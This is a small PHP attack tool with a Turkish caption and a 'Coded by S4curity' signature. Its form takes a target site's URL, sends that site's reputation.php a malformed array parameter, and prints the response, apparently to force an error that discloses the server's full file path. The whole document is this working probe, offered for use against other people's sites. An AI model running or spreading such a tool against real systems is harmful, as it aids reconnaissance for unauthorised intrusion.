Dizin Yolu bulucu curl'la deniyim dedim
<form method="post">
<input type="text" name="url">
<br>
<input type="submit" value="Umut'ta inan yalan söylmez">
</form>
Coded by S4curity
<?php
//Special Thanks:BabaYarisi
$url = $_POST["url"];
$ch=curl_init();
curl_setopt($ch,CURLOPT_URL,$url."reputation.php?page[spycrew.info*bug-S4]=3&uid=1");
curl_setopt($ch,CURLOPT_POST,1);
curl_setopt($ch,CURLOPT_COOKIE, $strCookie);
$veri = curl_exec($ch);
curl_close($ch);
echo $veri;
?>
